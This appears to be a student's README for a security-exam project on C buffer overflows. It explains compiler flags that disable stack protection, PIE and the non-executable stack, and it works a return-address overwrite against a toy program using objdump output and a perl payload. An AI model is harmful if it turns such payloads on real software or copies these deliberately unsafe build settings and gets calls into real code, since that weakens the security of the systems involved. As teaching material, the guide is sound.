# C Buffer Overflow guide

# Introduction

C buffer overflow project for Security exam.

Makefile CFLAG are ```-std=c99``` (Standard C 99) since it allows gets (unsafe function),


### What do these flags do?

1. **`-fno-stack-protector`**  
   Disables the stack protector (Stack Smashing Protector, SSP).  
   Normally, the compiler inserts extra code to detect buffer overflows and prevent exploitation. Using this flag removes that protection, making it easier to cause and exploit buffer overflows.

2. **`-no-pie`**  
   Disables Position Independent Executable (PIE) generation.  
   Modern programs are usually compiled as PIE to support ASLR (Address Space Layout Randomization), which randomizes memory addresses every run. Disabling PIE makes the executable have fixed addresses, making function and variable addresses predictable and exploitation easier.

3. **`-z execstack`**  
   Allows execution of code on the stack (exec stack).  
   Normally, the stack is marked non-executable (NX bit) to prevent executing injected code on the stack. This flag removes that protection, allowing code execution directly from the stack.

---

**In short:** These flags make the program much more vulnerable and permissive to buffer overflow exploits, useful for exercises or CTFs (Capture The Flag) where you want to practice exploitation techniques.



# Not checked (1)

Simple not-checked echo program, which can be exploited with sample input

```bash
➜  CBuffOverflow ✗ ./notchecked  hello     
Echo hello
```


## Exploited:



```bash
➜  CBuffOverflow ✗ ./notchecked  hellohello
Echo hellohello
*** stack smashing detected ***: terminated
[1]    10916 IOT instruction (core dumped)  ./notchecked hellohello


```

# Double call (2)

The idea behind this script is to call 2 times a function evicting the second part (in the first input call)

```c
int main(void) {
  printf("Init Program\n");
  doubleCall();
  printf("End Program\n");

  return 0;
}
```

So after the doubleCall func we will get again "Init Program".

Since I'm using 64 bit architecture the Stack frame pointer is 8 byte.

## Exploited

In order to exploit this code we need to objdump the script, in the file doublecall_objdump.txt you will find the entire objdump of the script

```
0000000000401050 <main>:
  401050:	48 83 ec 08          	sub    $0x8,%rsp
  401054:	48 8d 3d a9 0f 00 00 	lea    0xfa9(%rip),%rdi        # 402004 <_IO_stdin_used+0x4>
  40105b:	e8 d0 ff ff ff       	call   401030 <puts@plt>   # printf("INIT....")
  401060:	e8 0b 01 00 00       	call   401170 <doubleCall>
  401065:	48 8d 3d a5 0f 00 00 	lea    0xfa5(%rip),%rdi        # 402011 <_IO_stdin_used+0x11>
  40106c:	e8 bf ff ff ff       	call   401030 <puts@plt>    # printf("END.....")
  401071:	31 c0                	xor    %eax,%eax
  401073:	48 83 c4 08          	add    $0x8,%rsp
  401077:	c3                   	ret
  401078:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40107f:	00 
```

As you can see the main function (Init) is located @ ```0000000000401050```

to exploit this program we need to fill the entire buffer (8 byte) + fill the stack frame pointer (8 byte) then inject the address we want to execute 

```bash
perl -e 'print "A"x16 . "\x50\x10\x40\x00\x00\x00\x00\x00"' | ./doublecall
Init Program
AAAAAAAAAAAAAAAAP@
Init Program

End Program
zsh: done                              perl -e 'print "A"x16 . "\x50\x10\x40\x00\x00\x00\x00\x00"' | 
zsh: segmentation fault (core dumped)  ./doublecall
```

---

Ax16 (8 byte buff + 8 byte stack frame pointer) + main address to re-execute the code





